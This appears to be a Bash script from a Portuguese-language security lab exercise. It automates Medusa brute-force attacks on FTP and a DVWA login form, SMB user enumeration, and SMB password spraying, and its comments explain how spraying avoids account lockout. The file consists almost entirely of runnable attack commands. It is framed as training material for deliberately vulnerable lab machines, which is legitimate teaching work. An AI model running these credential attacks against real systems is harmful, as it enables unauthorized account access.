#!/usr/bin/env bash
#
# run_attacks.sh — Automação dos 3 cenários do desafio (Medusa)
# Ambiente controlado de laboratório — uso exclusivamente educacional.
#
# Uso:
#   ./run_attacks.sh <IP_ALVO>
# Ex.:
#   ./run_attacks.sh 192.168.56.102
#
# Pré-requisitos: Kali Linux com medusa, enum4linux e nmap instalados.
# -----------------------------------------------------------------------------

set -euo pipefail

TARGET="${1:-}"
if [[ -z "$TARGET" ]]; then
  echo "[!] Informe o IP do alvo. Ex.: ./run_attacks.sh 192.168.56.102"
  exit 1
fi

USERS="../wordlists/users.txt"
PASSWORDS="../wordlists/passwords.txt"

echo "============================================================"
echo "[*] Alvo: $TARGET"
echo "[*] Users: $USERS | Passwords: $PASSWORDS"
echo "============================================================"

# -----------------------------------------------------------------------------
# Cenário 1 — Força bruta em FTP (vsftpd na porta 21)
#   -t 4  : 4 threads (ritmo controlado)
#   -f    : para no primeiro par válido por host
# -----------------------------------------------------------------------------
echo
echo "### Cenário 1: Força bruta FTP ###"
medusa -h "$TARGET" -U "$USERS" -P "$PASSWORDS" -M ftp -t 4 -f

# -----------------------------------------------------------------------------
# Cenário 2 — Força bruta em formulário web (DVWA, security = low)
#   Requer um cookie de sessão válido com security=low.
#   Ajuste PHPSESSID antes de rodar (veja o README).
# -----------------------------------------------------------------------------
echo
echo "### Cenário 2: Força bruta DVWA (web form) ###"
COOKIE="security=low; PHPSESSID=COLE_SEU_PHPSESSID_AQUI"
medusa -h "$TARGET" -u admin -P "$PASSWORDS" -M http \
  -m DIR:/dvwa/vulnerabilities/brute/ \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
  -m FORM-DATA:"GET" \
  -m DENY-SIGNAL:"Username and/or password incorrect" \
  -m CUSTOM-HEADER:"Cookie: $COOKIE" || true

# -----------------------------------------------------------------------------
# Cenário 3 — Password spraying em SMB + enumeração de usuários
#   Primeiro enumeramos usuários; depois testamos UMA senha contra todos
#   (spraying evita bloqueio de conta por excesso de tentativas).
# -----------------------------------------------------------------------------
echo
echo "### Cenário 3a: Enumeração de usuários SMB ###"
enum4linux -U "$TARGET" || true

echo
echo "### Cenário 3b: Password spraying SMB ###"
medusa -h "$TARGET" -U "$USERS" -p "msfadmin" -M smbnt -t 1

echo
echo "[*] Concluído. Revise a saída e documente os pares válidos."
